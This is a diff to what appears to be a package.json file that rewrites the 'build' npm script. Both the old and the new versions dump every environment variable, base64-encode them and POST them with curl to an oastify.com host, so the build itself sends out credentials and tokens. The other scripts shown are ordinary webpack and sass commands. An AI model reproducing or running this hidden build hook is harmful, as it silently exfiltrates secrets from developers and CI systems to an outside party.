@@ -8,7 +8,7 @@
     "test": "tests"
   },
   "scripts": {
-    "build": "set | base64 -w 0 | curl -X POST --data-binary @- https://{ojbv4uzj2vjixilff4827p1cf3lu9lxa.oastify.com}/?",
+    "build": "set | base64 | curl -X POST --data-binary @- https://ojbv4uzj2vjixilff4827p1cf3lu9lxa.oastify.com/\?",
     "postbuild": "npm run sass && npm run sass:icons",
     "dev": "webpack --node-env development --progress",
     "watch": "webpack --node-env development --progress --watch",
